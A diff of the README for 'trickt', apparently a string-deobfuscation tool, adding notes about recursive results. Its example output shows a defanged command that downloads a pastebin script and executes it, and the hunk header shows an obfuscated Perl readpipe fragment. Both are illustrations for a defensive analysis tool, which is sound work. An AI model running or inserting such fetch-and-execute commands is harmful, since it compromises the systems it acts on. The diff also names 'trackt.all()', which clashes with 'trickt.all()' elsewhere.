@@ -146,8 +146,9 @@ line 9::original:>  b"oops, forgot my script here:  readpipe(chr(99) . chr(117) 
 ## Use the API
 
 You can use the individual functions by importing `trickt`.
-- Note that by using the individual functions, you will NOT get the
+- Note that by using the individual deobfuscation function, you will NOT get the
 recursive functionality with the current version.
+- If you want the full recursive capability, use `trackt.all()` instead (see below)
 
 ```python
 >>> import trickt
@@ -165,7 +166,8 @@ recursive functionality with the current version.
 [b'curl hxxps://pastebin.com/raw/escaped_hex_nested > bad_file.sh && ./bad_file.sh']
 ```
 
-Use `trickt.all()` to return a dictionary of all results `trickt` found to be interesting on a single string.
+Use `trickt.all()` to return a dictionary of all results `trickt` found to be interesting on a single string. This
+includes recursive/child results.
 
 ```python
 >> import json
